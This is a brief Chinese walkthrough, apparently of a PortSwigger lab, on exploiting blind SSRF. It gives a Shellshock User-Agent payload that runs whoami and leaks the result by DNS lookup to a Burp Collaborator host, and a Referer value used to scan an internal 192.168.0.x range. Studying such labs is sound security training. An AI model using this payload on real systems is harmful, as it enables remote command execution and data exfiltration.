发现无法回显的ssrf。获取敏感信息证明危害：



首先安装：Collaborator Everywhere插件



然后将攻击的域名设置到范围中，这样Collaborator Everywhere才能对流量进行修改

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/ssrf/images/EE835930C030423A9EE2E58BA6FCC2F8clipboard.png)



再次抓包：

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/ssrf/images/6E5F90AFC5D24CCA9498BE56E00CF1DCclipboard.png)

Collaborator Everywhere已经添加了许多Shellshock paylod



对目标内网进行探测，并获取主机名：

更改user-agent为：

```javascript
 () { :; }; /usr/bin/nslookup $(whoami).t60giu97fmygladioymhxtjyxp3fr4.burpcollaborator.net
```

将域名更改为Burp Collaborator中的域名



更改Referer为：

```javascript
Referer: http://192.168.0.§1§:8080
```



对内网服务进行探测。点击开始攻击。几秒之后机会返回内网机器dns查询，并带上自己的主机名



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/ssrf/images/49B62CFACBB64D8ABB7B0DAD185CCF5Eclipboard.png)



